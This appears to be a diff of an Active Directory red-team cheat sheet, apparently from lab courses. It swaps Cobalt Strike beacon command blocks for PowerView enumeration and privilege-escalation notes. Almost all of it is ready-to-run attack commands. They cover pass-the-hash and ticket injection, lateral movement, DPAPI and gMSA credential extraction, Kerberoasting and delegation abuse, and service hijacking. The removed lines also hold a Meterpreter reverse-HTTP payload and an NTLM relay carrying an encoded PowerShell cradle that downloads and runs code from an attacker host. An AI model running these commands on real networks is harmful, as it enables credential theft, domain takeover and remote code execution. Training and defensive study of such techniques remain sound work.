-beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select MemberDistinguishedName
-
-# Get Domain GPO
-beacon> powerpick Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
-
-# Find the System where given GPO are applicable
-beacon> powerpick Get-DomainOU -GPLink "{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}" | select distinguishedName
-
-# Idenitfy domain users/group who have local admin via Restricted group or GPO 
-beacon> powerpick Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
-
-# Enumerates the machines where a specific domain user/group has local admin rights
-beacon> powerpick Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl
-
-# Get Domain Trusts
-beacon> powerpick Get-DomainTrust
-
-# Find Local Admin Access on other domain computers based on context of current user
-beacon> powerpick Find-LocalAdminAccess
-beacon> powerpick Invoke-CheckLocalAdminAccess -ComputerName <server_fqdn>
-
-beacon> powerpick Invoke-UserHunter
-beacon> powerpick Find-PSRemotingLocalAdminAccess -ComputerName <server_fqdn>
-beacon> powerpick Find-WMILocalAdminAccess -ComputerName <server_fqdn>
-
-``` 
-
-- Domain recon using SharpView binary
-
-```powershell
-beacon> execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain
-```
-
-- Domain recon using ADSearch
-
-```powershell
-
-beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=user"
-
-beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins*))"
-
-beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member
-
-# Kerberostable Users
-beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
-
-# ASEPROAST
-beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
-
-# Unconstrained Delegation
-beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
-
-# Constrained Delegation
-beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
-
-# Additionally, the `--json` parameter can be used to format the output in JSON
-```
-
-### User Impersonation
-
-- Pass The Hash Attack
-
-```powershell
-beacon> getuid
-beacon> ls \\web.dev.cyberbotic.io\c$
-
-# PTH using inbuild method in CS (internally uses Mimikatz)
-beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
-
-# Find Local Admin Access
-beacon> powerpick Find-LocalAdminAccess
-
-beacon> rev2self
-```
-
-- Pass The Ticket Attack
-
-```powershell
-# Create a sacrificial token with dummy credentials
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123
-
-# Inject the TGT ticket into logon session returned as output of previous command
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP
-
-# OR Combine above 2 steps in one
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123 /ticket:doIFuj[...snip...]lDLklP 
-
-beacon> steal_token 4748
-```
-
-- OverPass The Hash
-
-```powershell
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap
-
-# Use aes256 hash for better opsec, along with /domain and /opsec flags (better opsec)
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
-```
-
-- Token Impersonation & Proces Injection
-
-```powershell
-beacon> steal_token 4464
-beacon> inject 4464 x64 tcp-local
-beacon> shinject /path/to/binary
-```
-
-### Lateral Movement
-
-```powershell
-# using Jump
-beacon> jump psexec/psexec64/psexec_psh/winrm/winrm64 ComputerName beacon_listener
-
-# Using remote exec
-beacon> remote-exec psexec/winrm/wmi ComputerName <uploaded binary on remote system>
-
-# Example Windows Management Instrumentation (WMI)
-beacon> cd \\web.dev.cyberbotic.io\ADMIN$
-beacon> upload C:\Payloads\smb_x64.exe
-beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
-beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
-
-# Executing .Net binary remotely 
-beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web
-
-# Invoke DCOM (better opsec)
-beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
-beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
-beacon> link web.dev.cyberbotic.io agent_vinod
-
-NOTE: While using remote-exec for lateral movement, kindly generate the windows service binary as psexec creates a windows service pointing to uploaded binary for execution 
-```
-
-### Session Passing
-
-```powershell
-# CASE 1: Beacon Passing (Within Cobalt Strike - Create alternate HTTP beacon while keeping DNS as lifeline)
-beacon> spawn x64 http
-
-# CASE 2: Foreign Listener (From CS to Metasploit - Staged Payload - only x86 payloads)
-
-# Setup Metasploit listener
-attacker@ubuntu ~> sudo msfconsole -q
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
-msf6 exploit(multi/handler) > set LHOST ens5
-msf6 exploit(multi/handler) > set LPORT 8080
-msf6 exploit(multi/handler) > run
-
-# Setup a Foreign Listener in cobalt strike with above IP & port details
-
-# Use Jump psexec to execute the beacon payload and pass the session
-beacon> jump psexec Foreign_listener
-
-# CASE 3: Shellcode Injection (From CS to Metasploit - Stageless Payload)
-
-# Setup up metasploit
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_http
-msf6 exploit(multi/handler) > exploit
-
-# Generate binary
-ubuntu@DESKTOP-3BSK7NO ~> msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.50 LPORT=8080 -f raw -o /mnt/c/Payloads/msf_http_x64.bin
-
-# Inject msf shellcode into process memory
-beacon> shspawn x64 C:\Payloads\msf_http_x64.bin
+# Decrypt the secret using the retrieved master key
+# Alternatively, leave out /masterkey and add /unprotect to decrypt the secret using the cached master key (see above for caveats)
+dpapi::cred /in:C:\Users\[USERNAME]]\AppData\Local\Microsoft\Credentials\1EF01CC92C17C670AC9E57B53C9134F3 /masterkey:91721d8b1ec[...]e0f02c3e44deece5f318ad
 
 ```
 
-### Pivoting
+## Domain Enumeration
+
+#### Domian Details
 
 ```powershell
-# Enable Socks Proxy in beacon session (Use SOCKS 5 for better OPSEC)
-beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging
+# Get domain details  
+Get-Domain
+Get-Domain -Domain techcorp.local
+Get-DomainSID
 
-# Verify the SOCKS proxy on team server
-attacker@ubuntu ~> sudo ss -lpnt
+Get-DomainPolicyData
+(Get-DomainPolicyData).systemaccess
+(Get-DomainPolicyData -domain techcorp.local).systemaccess
 
-# Configure Proxychains in Linux
-$ sudo vim /etc/proxychains.conf
-socks5 127.0.0.1 1080 socks_user socks_password
+Get-DomainController -Domain techcorp.local
+```
 
-$attacker@ubuntu ~> proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10
-ubuntu@DESKTOP-3BSK7NO ~ > proxychains wmiexec.py DEV/jking@10.10.122.30
+#### Domian User, Group and Computer Objects
 
-# Use Proxifier for Windows environment 
-ps> runas /netonly /user:dev/bfarmer mmc.exe
-ps> mimikatz # privilege::debug
-ps> mimikatz # sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe
-PS C:\Users\Attacker> $cred = Get-Credential
-PS C:\Users\Attacker> Get-ADComputer -Server 10.10.122.10 -Filter * -Credential $cred | select
+```powershell
+# Domains Users
+Get-DomainUser -Identity studentuser1 -Properties *
+Get-DomainUser -LDAPFilter "Description=*" | Select Name,Description
+Get-DomainUser -TrustedToAuth | Select Name, msds-allowedtodelegateto
+Get-DomainUser -SPN | Select Name, ServicePrincipalName
 
-# Use FoxyProxy plugin to access Webportal via SOCKS Proxy
+# Domain Groups
+Get-DomainGroup -Domain techcorp.local
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
 
-# Reverse Port Forward (if teamserver is not directly accessible, then use rportfwd to redirect traffic)
-beacon> rportfwd 8080 127.0.0.1 80
-beacon> run netstat -anp tcp
-ps> iwr -Uri http://wkstn-2:8080/a
+# Find group membership of a user
+Get-DomainGroup -UserName studentuser1
+Get-DomainGroup -UserName 'studentuser41' | select distinguishedname
+net user student41 /domain
+whoami /groups
 
-beacon> powershell New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
-beacon> powershell Remove-NetFirewallRule -DisplayName "Test Rule"
+# Script to find group membership of user recursively 
+function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName) { $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname) $groups if ($groups.count -gt 0) { foreach ($group in $groups) { Get-ADPrincipalGroupMembershipRecursive $group } } };
+Get-ADPrincipalGroupMembershipRecursive 'studentuserx'
 
-# NTLM Relay
+# Find local group on machine (admin required for non-dc machines)
+Get-NetLocalGroup -ComputerName us-dc
 
-1. Setup SOCKS Proxy on the beacon
-beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging
+# Get members of local groups idenitied in prvious steps on a machine
+Get-NetLocalGroupMember -ComputerName us-dc
+Get-NetLocalGroupMember -ComputerName us-dc -GroupName Administrators
 
-2. Setup Proxychains to use this proxy
-$ sudo vim /etc/proxychains.conf
-socks5 127.0.0.1 1080 socks_user socks_password
+# Domain Computers
+Get-DomainComputer | select Name
+Get-DomainComputer -Unconstrained | select Name
+Get-DomainComputer -TrustedToAuth | select Name, msds-allowedtodelegateto
 
-3. Use Proxychain to send NTLMRelay traffic to beacon targeting DC and encoded SMB Payload for execution
-$ sudo proxychains ntlmrelayx.py -t smb://10.10.122.10 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA='
+# Interesting share
+Get-DomainFileServer
+Get-DomainDFSShare
+Get-NetShare
+Find-DomainShare
+Find-InterestingDomainShareFile
+Get-Childitem -Path C:\ -Force -Include <FILENAME OR WORD TO SEARCH> -Recurse -ErrorAction SilentlyContinue
 
-# iex (new-object net.webclient).downloadstring("http://10.10.123.102:8080/b")
+# Find Foreign Group Member (ForeignSecurityPrinicpals container as the container is populated only when a principal is added to a domain local security group, and not by adding user as pricipal owner via ACL)
+Find-ForeignGroup -Verbose
+Find-ForeignUser -Verbose
+Get-DomainForeignGroupMember
+Get-DomainForeignGroupMember -Domain <TARGET DOMAIN FQDN>
+````
 
-4. Setup reverse port forwarding 
-beacon> rportfwd 8080 127.0.0.1 80
-beacon> rportfwd 8445 127.0.0.1 445
+#### Domain GPO & OU Enumeration
 
-5. Upload PortBender driver and load its .cna file
-beacon> cd C:\Windows\system32\drivers
-beacon> upload C:\Tools\PortBender\WinDivert64.sys
-beacon> PortBender redirect 445 8445
+```powershell
+# GPO Enumeration
+Get-DomainGPO
 
-6. Manually try to access share on our system or use MSPRN, Printspooler to force authentication
+# Enumerate GPOs appliable to a given machine 
+Get-DomainGPO -ComputerIdentity student41.us.techcorp.local | select displayname
 
-7. Verify the access in weblog and use link command to connect with SMB beacon
-beacon> link dc-2.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
+# Find the GPO of RestrictedGroup type for local group membership
+Get-DomainGPOLocalGroup
+
+# Find the users which are in local group of a machine using GPO
+Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity us-mgmt
+
+# Find machines where a given user is member of specific group
+Get-DomainGPOUserLocalGroupMapping -Identity studentuser41
+
+# Get users which are in a local group of a machine in any OU using GPO
+(Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping
+
+# Get users which are in a local group of a machine in a particular OU using GPO
+(Get-DomainOU -Identity 'OU=Mgmt,DC=us,DC=techcorp,DC=local').distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping
+
+## Domain Enumeration - OU 
+
+# Enumerate OU (associated GPO ID is present in GPLINK attribute)
+Get-DomainOU | select displayname, gplink
+
+# Find GPO applied to given OU by doing lookup of GPO ID identified in previous step
+Get-DomainGPO -Identity '{FCE16496-C744-4E46-AC89-2D01D76EAD68}'
+
+# Find users which are in local group of computers across all OUs
+(Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase $_ } | Get-DomainGPOComputerLocalGroupMapping
+
+(Get-DomainOU -Identity 'OU=Mgmt,DC=us,DC=techcorp,DC=local').distinguishedname | %{Get-DomainComputer -SearchBase $_ } | Get-DomainGPOComputerLocalGroupMapping
 
 ```
 
-### Data Protection API
+#### Domain ACL Enumeration
 
 ```powershell
-# Use mimikatz to dump secrets from windows vault
-beacon> mimikatz !vault::list
-beacon> mimikatz !vault::cred /patch
+# Find ACL associated with any given object
+Get-DomainObjectAcl -Identity Student41
+Get-DomainObjectAcl -Identity Student41 -ResolveGUIDs | select -First 1
 
-# Part 1: Enumerate stored credentials
+# Find ACL accositaed with given LDAP Path
+Get-DomainObjectAcl -Searchbase "LDAP://CN=Domain Admins,CN=Users,DC=us,DC=techcorp,DC=local" -ResolveGUIDs
 
-0. Check if system has credentials stored in either web or windows vault
-beacon> run vaultcmd /list
-beacon> run vaultcmd /listcreds:"Windows Credentials" /all
-beacon> run vaultcmd /listcreds:"Web Credentials" /all
-beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
+# Find Intresting Domain ACL
+Find-InterestingDomainAcl -ResolveGUIDs | select -First 1
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentuserx"}
 
-# Part 2.1: Scheduled Task Credentials
+# Find ACL Associated with PATH
+Get-PathAcl -Path "\\us-dc\sysvol"
 
-1. Credentials for task scheduler are stored at below location in encrypted blob
-beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+# Enumerate permissions for group
+Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
+Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
 
-2. Find the GUID of Master key associated with encrypted blob (F31...B6E)
-beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E
+Reference:
+https://github.com/cyberark/ACLight
+```
 
-3. Dump all the master keys and filter the one we need based on GUID identified in previous step
-beacon> mimikatz !sekurlsa::dpapi
+#### Domain Trust Enumeration
 
-4. Use the Encrypted Blob and Master Key to decrypt and extract plain text password
-beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
+```powershell
+# Enumerate the trust for current domain
+Get-DomainTrust
+Get-DomainTrust -Domain Techcorp.local
 
-# Part 2.2: Extracting stored RDP Password 
+# Enumerate Forest Level details
+Get-Forest
+Get-ForestDomain
+Get-ForestGlobalCatalog
+Get-ForestTrust
 
-1. Enumerate the location of encrypted credentials blob (Returns ID of Enc blob and GUID of Master Key)
-beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles
+# Trust Enumeration using AD Module
+(Get-ADForest).Domains
+Get-ADTrust -Filter *
+```
 
-2. Verify the credential blob in users cred directory (Note enc blob ID)
-beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials
+#### Domain User Hunting
 
-3. Master key is stored in users Protect directory (Note GUID of master key matching with Seatbelt)
-beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104
+```powershell
+## Domain Enumeration - User Hunting
 
-4. Decrypt the master key (Need to be execute in context of user who owns the key, use @ modifier)
-beacon> mimikatz !sekurlsa::dpapi
-beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc
+# Find the local admin access across all the computers
+Find-localAdminAccess
 
-5. Use Master key to decrypt the credentials blob
-beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
+# Use WMI and PSRemoting for remote system access
+Find-WMILocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess.ps1
+
+# Find the active session of Domain User/Group 
+Find-DomainUserLocation
+Find-DomainUserLocation -CheckAccess
+Find-DomainUserLocation -UserGroupIdentity "StudentUsers"
+Find-DomainUserLocation -Stealth
 
 ```
 
-### Kerberos
+
+#### BloodHound
+
+```powershell
+# Run sharphound collector 
+cd C:\AD\Tools\BloodHound-master\Collectors
+SharpHound.exe --CollectionMethods All
+
+# Use powershell based collector
+. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1
+Invoke-BloodHound -CollectionMethods All
+
+#Copy neo4j-community-3.5.1 to C:\
+#Open cmd
+cd C:\neo4j\neo4j-community-3.5.1-windows\bin
+neo4j.bat install-service
+neo4j.bat start
+#Browse to BloodHound-win32-x64 
+Run BloodHound.exe
+#Change credentials and login
+```
+
+#### Privilege Escalation - Local
+
+```powershell
+## Privilege Escalation
+
+# PrivEsc Tools
+Invoke-PrivEsc (PrivEsc)
+winPEASx64.exe (PEASS-ng)
+
+# PowerUp
+. C:\AD\Tools\PowerUp.ps1
+Invoke-AllChecks
+Get-SericeUnquoted -Verbose
+Get-ModifiableServiceFile -Verbose
+Get-ModifiableService -Verbose
+
+Invoke-ServiceAbuse -Name "ALG" 
+Invoke-ServiceAbuse -Name ALG -UserName us\studentuserx -Verbose
+Invoke-ServiceAbuse -Name "ALG" -Command "net localgroup Administrators studentuser41 /add"
+Write-ServiceBinary -Name 'VulnerableSvc' -Command 'c:\windows\system32\rundll32 c:\Users\Public\beacon.dll,Update' -Path 'C:\Program Files\VulnerableSvc'
+
+net localgroup Administrators
+
+net.exe stop VulnerableSvc
+net.exe start VulnerableSvc
+
+```
+
+#### Privilege Escalation - Domain
 
 ```powershell
 
-# Kerberosting
-beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
+>> Privilege Escalation - Kerberosting
 
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
+# Keberoasting
+Get-DomainUser -SPN | select cn, serviceprincipalname
+.\Rubeus.exe kerberoast /stats
+.\Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec /outfile:hashes.txt
 
-ps> hashcat -a 0 -m 13100 hashes wordlist
+# Targeted Kerberosting
+Set-DomainObject -Identity support1user -Set @{serviceprincipalname='us/myspn'}
 
-# ASREPRoast
-beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
+# Cracking the password
+C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
 
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap
+>> Privilege Escalation - gMSA
 
-ps> hashcat -a 0 -m 18200 svc_oracle wordlist
+- Step 1. Identify the gMSA account by filtering ObjectClass 
+Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
 
-# Unconstrained Delegation (Caches TGT of any user accessing its service)
+- Step 2. Identify pricipal having access to the gMSA account via ADModule
+Get-ADServiceAccount -Filter * -Properties name, ObjectClass
+Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
 
-1. Identify the computer objects having Unconstrained Delegation enabled
-beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
+- Step 3. Fetch the Password Blob
+$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
 
-2. Dumping the cached TGT ticket (requires system access on affected system)
-beacon> getuid
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
+- Step 4. Convert the password blob to NTLM hash
+Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
+$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
+ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
 
-3. Execute PrintSpool attack to force DC to authenticate with WEB 
-beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io
-
-4. Use Machine TGT (DC) fetched to gain RCE on itself using S4U abuse (/self flag)
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap
-
-5. Inject the ticket and access the service
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=
-
-beacon> steal_token 2664
-beacon> ls \\dc-2.dev.cyberbotic.io\c$
-
-
-# Constrained Delegation (allows to request TGS for any user using its TGT)
-
-1. Identify the computer objects having Constrained Delegation is enabled
-beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
-
-2. Dump the TGT of User/Computer Account having constrained Delegation enabled (use asktgt if NTLM hash)
-beacon> getuid
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
-
-3. Use S4U technique to request TGS for delegated service using machines TGT (Use S4U2Proxy tkt)
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap
-
-4. OR, Access other alternate Service not stated in Delegation attribute (ldap)
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap
-
-5. Inject the S4U2Proxy tkt from previous step
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
-
-6. Access the services 
-beacon> steal_token 5540
-beacon> ls \\dc-2.dev.cyberbotic.io\c$
-beacon> dcsync dev.cyberbotic.io DEV\krbtgt
-
-
-# Resource-Based Constrained Delegation (Systems having writable msDS-AllowedToActOnBehalfOfOtherIdentity)
-
-1. Identify the Computer Objects which has AllowedToActOnBehalfOfOtherIdentity attribute defined
-beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" --attributes dnshostname,samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity --json
-
-2. OR, Identify the Domain Computer where we can write this atribute with custom value 
-beacon> powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
-
-beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
-
-3. Next we will assign delegation rights to our computer by modifying the attribute of target system
-beacon> powerpick Get-DomainComputer -Identity wkstn-2 -Properties objectSid
-beacon> powerpick $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
-
-4. Verify the updated attribute
-beacon> powerpick Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
-
-5. Get the TGT of our computer
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
-
-6. Use S4U technique to get TGS for target computer using our TGT
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap
-
-7. Access the services
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=
-
-beacon> steal_token 4092
-beacon> ls \\dc-2.dev.cyberbotic.io\c$
-
-8 Remove the delegation rights
-beacon> powerpick Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
-
-OR, Create Fake computer Account for RBCD Attack
-
-9. Check if we have permission to create computer account (default allowed)
-beacon> powerpick Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota
-
-10. Create a fake computer with random password (generate hash using Rubeus)
-beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
-PS> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io
-
-11. Use the Hash to get TGT for our fake computer, and rest of the steps remains same
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
-
+- Step 5. Use the passwd hash
+C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:jumpone /domain:us.techcorp.local /ntlm:0a02c684cc0fa1744195edd1aec43078 /run:cmd.exe" "exit"
 ```
 
-### Active Directory Certificate Services
 
-```powershell
-# Finding Certificate Authorities
-beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
-
-# Miconfigured Certificate template
-beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
-
